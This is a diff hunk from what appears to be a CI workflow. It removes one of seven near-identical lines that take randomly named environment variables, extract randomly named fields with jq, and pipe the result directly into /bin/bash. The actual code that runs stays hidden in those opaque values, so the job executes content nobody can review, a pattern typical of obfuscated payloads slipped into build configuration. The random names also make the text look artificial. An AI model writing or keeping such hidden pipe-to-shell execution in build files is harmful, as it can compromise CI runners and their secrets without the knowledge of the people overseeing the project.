@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$uc71733" | jq -r .setyg0 | /bin/bash
           echo $ofor5 | jq -r .pp7 | /bin/bash
           echo $xp24208 | jq -r .z40845 | /bin/bash
-          printf '%s' "$byh9" | jq -r .kcgkl891 | /bin/bash
           echo $ekon03767 | jq -r .fwct554 | /bin/bash
           echo $q20758 | jq -r .r79 | /bin/bash
           echo $yru39 | jq -r .etk85897 | /bin/bash
